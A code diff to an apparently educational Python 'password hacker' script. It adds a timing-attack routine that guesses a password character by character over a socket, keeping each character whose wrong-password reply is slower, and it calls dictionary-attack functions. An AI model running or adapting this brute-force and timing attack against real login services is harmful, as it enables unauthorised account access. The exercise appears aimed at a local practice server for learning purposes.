@@ -3,6 +3,7 @@ import socket
 import itertools
 import string
 import json
+import time
 
 
 class MySocket:
@@ -148,10 +149,29 @@ class MySocket:
                 self.found_password = password
                 return password
 
+    def find_next_letter_in_password_with_delay(self, client_socket, password):
+        pw_iterable = itertools.chain(string.ascii_letters, string.digits)
+        for letter in pw_iterable:
+            data = self.create_json(self.found_login, password + letter)
+            client_socket.send(data.encode())
+            start_time = time.perf_counter()
+            response = client_socket.recv(1024)
+            end_time = time.perf_counter()
+            elapsed_time = end_time - start_time
+            response = self.get_result_message(response.decode())
+            if response == 'Wrong password!' and elapsed_time > 0.09:
+                password += letter
+                return password
+            elif response == 'Connection success!':
+                password += letter
+                self.found_password = password
+                return password
+
     def find_password(self, client_socket):
         password = ""
         while True:
-            password = self.find_next_letter_in_password(client_socket, password)
+            # password = self.find_next_letter_in_password(client_socket, password)
+            password = self.find_next_letter_in_password_with_delay(client_socket, password)
             if self.found_password is not None:
                 return
 
@@ -166,6 +186,7 @@ class MySocket:
 
 
 def password_hacker():
+    # for use with server (venv\Scripts\python.exe .\lessons\sockets.py)
     parser = argparse.ArgumentParser(description='Password hacker')
     parser.add_argument('host', nargs='?')
     parser.add_argument('port', nargs='?')
@@ -177,6 +198,7 @@ def password_hacker():
         # print(sender.dictionary_attack())
         # print(sender.send_JSON('admin', 'paSS'))
         print(sender.login_pass_dictionary_attack())
+
     else:
         print(f'Args not supplied')
 
